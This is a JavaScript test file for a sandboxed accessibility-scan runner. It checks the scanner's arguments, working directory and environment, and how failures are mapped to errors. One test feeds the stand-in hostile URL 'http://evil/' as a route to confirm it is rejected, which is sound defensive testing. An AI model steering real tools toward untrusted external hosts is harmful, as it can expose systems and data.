test('runFreshSandboxScan uses exact argv, cwd, and ADA_SCAN_ROOT', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-scan-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const report = buildDemoReport('src/partials/layout/header.liquid');
    mkdirSync(join(root, 'scan-reports'), { recursive: true });
    writeFileSync(join(root, 'scan-reports', 'latest.json'), `${JSON.stringify(report)}\n`);

    await assert.rejects(
      () => runFreshSandboxScan({ sandboxRoot: root, route: 'http://evil/' }),
      (error) => error instanceof DemoSandboxError && error.code === 'INVALID_ROUTE',
    );

    let captured = null;
    const scanned = await runFreshSandboxScan({
      sandboxRoot: root,
      route: '/',
      runCommand: async (command, args, cwd, options) => {
        captured = { command, args, cwd, extraEnv: options.extraEnv };
        return { code: 0, stdout: '', stderr: '' };
      },
    });
    assert.equal(captured.command, process.execPath);
    assert.deepEqual(captured.args, [
      resolveTrustedPackageScannerExecutable(),
      '--page', '/',
      '--layers', 'axe,accessScan',
      '--no-psi',
      '--no-fail',
      '--force-build',
    ]);
    assert.equal(realpathSync(captured.cwd), realpathSync(root));
    assert.equal(realpathSync(captured.extraEnv.ADA_SCAN_ROOT), realpathSync(root));
    assert.equal(scanned.report.reportId, report.reportId);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('runFreshSandboxScan maps subprocess and malformed report failures', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-scan-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });

    await assert.rejects(
      () => runFreshSandboxScan({
        sandboxRoot: root,
        route: '/',
        runCommand: async () => ({ code: 2, stdout: '', stderr: 'boom' }),
      }),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SCAN_FAILED',
    );

    mkdirSync(join(root, 'scan-reports'), { recursive: true });
    writeFileSync(join(root, 'scan-reports', 'latest.json'), '{ "bad": true }\n');
    await assert.rejects(
      () => runFreshSandboxScan({
        sandboxRoot: root,
        route: '/',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      }),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SCAN_REPORT_INVALID',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
